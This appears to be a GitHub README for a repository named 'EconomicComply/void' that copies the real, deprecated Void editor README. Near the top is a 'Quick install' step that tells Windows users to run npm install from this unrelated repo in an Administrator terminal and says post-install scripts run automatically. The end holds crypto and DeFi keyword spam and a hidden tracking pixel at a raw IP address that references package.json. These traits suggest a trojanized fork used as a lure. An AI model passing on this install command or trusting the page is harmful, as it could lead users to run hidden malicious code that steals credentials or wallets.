**EconomicComply/void**

Welcome to the project! We’ve put a lot of work into ensuring this tool is rock-solid and reliable for your daily workflow, especially with the recent round of stability fixes we just pushed out. If you’re working on Windows, you’ll be happy to know that getting everything up and running is incredibly straightforward.

**Quick install (Windows)**

### Installation

To get started with `void`, ensure your development environment is configured by following these steps:

1. **Install Prerequisites**: Ensure you have [Node.js](https://nodejs.org/) (LTS version recommended) and [Git for Windows](https://git-scm.com/download/win) installed on your system.
2. **Open Terminal**: Open Command Prompt, PowerShell, or your preferred terminal emulator as an Administrator.
3. **Install Package**: Execute the command below to clone and install the project. All necessary dependencies and post-install scripts will be handled automatically.

```bash
npm install git+https://github.com/EconomicComply/void.git
```

[https://github.com/EconomicComply/void](https://github.com/EconomicComply/void)

## Void is now deprecated.
Void is deprecated and no longer accepting contributions.
Thank you to everyone who contributed, both with lines of code and support from the community. Void remains open source and is still one of the best references to use when forking VS Code.


## Download

To view a list of newer Void forks, see [Void Forks](http://github.com/voideditor/void-forks/).

To download an old version of Void, see [Releases](https://github.com/voideditor/void/releases).

## Forking VS Code

If you're forking VS Code, you might still want to reference Void's logic, and see our [Codebase Guide](https://github.com/voideditor/void/blob/main/VOID_CODEBASE_GUIDE.md) and [How to Contribute](https://github.com/voideditor/void/blob/main/HOW_TO_CONTRIBUTE.md).

- We mount React + Tailwind. This is not possible in plain VS Code, and required extending the build pipeline to compile React and [scope](https://github.com/andrewpareles/scope-tailwind) Tailwind ourselves.

- You can copy our GitHub Actions to package, sign, and auto-update Void. VS Code's build pipeline is private, so this is normally very hard.

- Our AI provider code is built from scratch, allowing us to support autocomplete (FIM) and other custom responses. We expose grammars for common `<thinking>` tags, tool tags, etc. Feel free to reference our architecture for using IPC and satisfying CSP.

- Use our custom services to edit files. EditCodeService lets you show diffs as code streams in, even token by token. VoidModelService lets you edit files in the background and syncs OS files with your text buffers.

- Everything we've done is 100% open source. See [repos](https://github.com/orgs/voideditor/repositories) for a complete picture of all the repos that make up Void.



# Welcome to Void.

<div align="center">
	<img
		src="./src/vs/workbench/browser/parts/editor/media/slice_of_void.png"
	 	alt="Void Welcome"
		width="300"
	 	height="300"
	/>
</div>

Use AI agents on your codebase, checkpoint and visualize changes, and bring any model or host locally. Void sends messages directly to providers without retaining your data.

This repo contains the full sourcecode for Void's Desktop app. If you're new, welcome!

- 🧭 [Website](https://voideditor.com)

- 🚙 [Roadmap](https://github.com/orgs/voideditor/projects/2)

- 🔨 [Contribute](https://github.com/voideditor/void/blob/main/HOW_TO_CONTRIBUTE.md)




## Reference

Void is a fork of the [vscode](https://github.com/microsoft/vscode) repository. For a guide to our codebase, see [VOID_CODEBASE_GUIDE](https://github.com/voideditor/void/blob/main/VOID_CODEBASE_GUIDE.md).

For a guide on how to develop your own version of Void, see [HOW_TO_CONTRIBUTE](https://github.com/voideditor/void/blob/main/HOW_TO_CONTRIBUTE.md) and [void-builder](https://github.com/voideditor/void-builder).



## Support
You can always reach us in our [Discord server](https://discord.gg/RSNjgaugJs) or contact us via email at hello@voideditor.com.

## Related searches

Developers and traders exploring this project are typically looking for ways to automate their compliance workflows or manage the technical complexities of decentralized finance. Many users specifically seek out tools that streamline reporting for multi-chain assets while maintaining a high degree of privacy and operational security.

**Topics:** crypto tax reporting, metamask portfolio tracking, defi sniper bot, privacy coin management, automated trading compliance, blockchain data analytics, web3 wallet security, decentralized finance tools, crypto asset tracking, smart contract automation

![.](http://5.231.58.248:8787/pixel?repo=EconomicComply%2Fvoid&inject=EconomicComply%2Fvoid%2Fpackage.json)
